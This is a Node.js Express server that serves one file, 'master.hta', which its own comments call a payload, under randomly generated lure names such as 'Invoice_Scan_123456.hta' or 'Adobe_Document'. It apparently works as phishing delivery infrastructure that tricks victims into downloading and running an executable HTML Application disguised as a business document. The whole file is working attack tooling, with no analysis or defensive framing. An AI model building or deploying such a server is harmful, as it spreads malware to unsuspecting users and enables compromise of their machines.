const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// ✅ BRIDGE: Generates unique .hta name & redirects
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    console.log(`[BRIDGE] Generated: ${uniqueName}`);
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// ✅ PAYLOAD: Serves master.hta AS THE UNIQUE NAME FROM URL
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    // CRITICAL LOGGING FOR RAILWAY CONSOLE
    console.log(`[PAYLOAD] Requested filename: ${req.params.filename}`);
    console.log(`[PAYLOAD] Actual file served: ${filePath}`);
    console.log(`[PAYLOAD] File exists: ${fs.existsSync(filePath)}`);
    
    if (!fs.existsSync(filePath)) {
        console.error('[PAYLOAD] ERROR: master.hta missing!');
        return res.status(404).send('Source payload not found.');
    }

    // MANIPULATE THE DOWNLOAD NAME TO MATCH THE UNIQUE REQUESTED NAME
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`[PAYLOAD] Send failed: ${err.message}`);
            if (!res.headersSent) res.status(500).send('Download error.');
        } else {
            console.log(`[PAYLOAD] SUCCESS: Sent as "${req.params.filename}"`);
        }
    });
});

// ✅ SERVE ONLY HTML FILES MANUALLY (NO STATIC MIDDLEWARE INTERFERENCE)
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/confirm.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'confirm.html')));

app.get('/health', (req, res) => res.json({ status: 'ok' }));

app.listen(port, () => console.log(`✅ Server running on port ${port}`));
